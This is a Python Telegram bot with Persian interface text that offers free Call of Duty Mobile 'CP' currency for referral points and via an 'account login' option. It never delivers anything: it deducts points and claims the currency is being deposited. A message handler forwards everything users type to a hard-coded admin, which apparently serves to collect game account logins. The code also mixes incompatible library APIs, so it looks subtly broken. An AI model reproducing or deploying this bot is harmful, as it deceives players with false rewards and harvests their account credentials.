import os
from flask import Flask, request
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [8349784604]
BOT_USERNAME = "FreecodmCp2025_bot"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot=bot, update_queue=None, use_context=True)

users = {}
account_info = {}
cp_costs = {"💎 80 CP": 3, "💎 200 CP": 6, "💎 1024 CP": 9, "💎 2800 CP": 12}
cp_points_needed = {"💎 80 CP": 1, "💎 200 CP": 5, "💎 1024 CP": 10, "💎 2800 CP": 20}

app = Flask(__name__)

# ---------- منوی اصلی ----------
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 CP رایگان", callback_data="cp")],
        [InlineKeyboardButton("👥 افراد دعوت شده", callback_data="invited")],
        [InlineKeyboardButton("⭐️ امتیاز من", callback_data="points")],
        [InlineKeyboardButton("🔗 لینک اختصاصی", callback_data="link")],
        [InlineKeyboardButton("💳 CP با ورود به اکانت", callback_data="login")]
    ])

# ---------- هندلر start ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in users:
        users[user_id] = {"points": 0, "invited": []}
    await update.message.reply_text(
        "👋 سلام! به ربات CP رایگان خوش آمدی.\nلطفاً از منو یکی را انتخاب کن:",
        reply_markup=main_menu()
    )

# ---------- هندلر دکمه‌ها ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    back_button = [[InlineKeyboardButton("🔙 برگشت", callback_data="main")]]

    # CP رایگان یا ورود به اکانت
    if data == "cp" or data == "login":
        keyboard = [[InlineKeyboardButton(cp, callback_data=f"cp_{cp}")] for cp in cp_costs.keys()]
        keyboard.append(back_button[0])
        await query.edit_message_text("💎 یکی از گزینه‌های CP را انتخاب کن:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("cp_"):
        cp = data[3:]
        cost = cp_costs[cp]

        # ورود به اکانت
        if user_id in account_info:
            points_needed = cp_points_needed[cp]
            if users.get(user_id, {"points":0})["points"] >= points_needed:
                users[user_id]["points"] -= points_needed
                await query.edit_message_text(f"✅ {cp} انتخاب شد!\n💳 CP در حال واریز است ⏳", reply_markup=InlineKeyboardMarkup(back_button))
                del account_info[user_id]
            else:
                await query.edit_message_text(f"❌ برای {cp} نیاز به {points_needed} امتیاز داری.", reply_markup=InlineKeyboardMarkup(back_button))

        # CP رایگان
        elif users.get(user_id, {"points":0})["points"] >= cost:
            users[user_id]["points"] -= cost
            await query.edit_message_text(f"✅ {cp} انتخاب شد!\n💳 CP در حال واریز است ⏳", reply_markup=InlineKeyboardMarkup(back_button))
        else:
            await query.edit_message_text(f"❌ امتیاز کافی نداری! برای {cp} باید {cost} امتیاز داشته باشی.", reply_markup=InlineKeyboardMarkup(back_button))

    elif data == "invited":
        invited = users[user_id]["invited"]
        text = "👥 افرادی که دعوت کردی:\n" + "\n".join(str(i) for i in invited) if invited else "❌ هنوز کسی را دعوت نکردی."
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(back_button))

    elif data == "points":
        points = users[user_id]["points"]
        available_cp = [cp for cp, cost in cp_costs.items() if points >= cost]
        cp_text = "\n💎 CP قابل انتخاب: " + ", ".join(available_cp) if available_cp else "\n❌ هنوز CP قابل انتخاب نداری."
        await query.edit_message_text(f"⭐️ امتیاز فعلی شما: {points}{cp_text}", reply_markup=InlineKeyboardMarkup(back_button))

    elif data == "link":
        invite_link = f"https://t.me/{BOT_USERNAME}?start=inv_{user_id}"
        await query.edit_message_text(f"🔗 لینک اختصاصی تو:\n{invite_link}", reply_markup=InlineKeyboardMarkup(back_button))

    elif data == "main":
        await query.edit_message_text("🔙 به منوی اصلی برگشتی", reply_markup=main_menu())

# ---------- هندلر پیام‌ها ----------
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    # ارسال پیام به ادمین‌ها
    for admin_id in ADMIN_IDS:
        await bot.send_message(chat_id=admin_id, text=f"📩 پیام از {user_id} ({update.effective_user.first_name}):\n{text}")

# ---------- ثبت هندلرها ----------
dp.add_handler(CommandHandler("start", start))
dp.add_handler(CallbackQueryHandler(button_handler))
dp.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), text_handler))

# ---------- Webhook ----------
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dp.process_update(update)
    return "OK"

@app.route("/")
def index():
    return "Bot is running"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
